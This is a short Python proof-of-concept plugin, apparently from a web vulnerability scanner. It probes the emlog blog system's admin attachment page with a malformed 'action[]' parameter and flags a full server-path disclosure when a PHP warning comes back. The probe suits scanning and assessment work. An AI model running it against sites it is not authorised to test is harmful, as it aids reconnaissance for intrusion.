# Author:w8ay
# Name:emlog博客系统真实路径泄露
#__Author__ = w8ay

import HackRequests


def poc(arg, **kwargs):
    payload = '/admin/attachment.php?action[]='
    target = arg + payload
    hack = HackRequests.hackRequests()
    hh = hack.http(target)
    if hh.status_code == 200 and '<b>Warning</b>' in hh.text():
        result = {
            "name": "emlog 博客系统真实路径泄露",  # 插件名称
            "content": "emlog博客系统默认开启全部报错，导致可以泄露真实脚本路径",  # 插件返回内容详情，会造成什么后果。
            "url": target,  # 漏洞存在url
            "log": hh.log,
            "tag": "info_leak"  # 漏洞标签
        }
        return result


if __name__ == "__main__":
    pass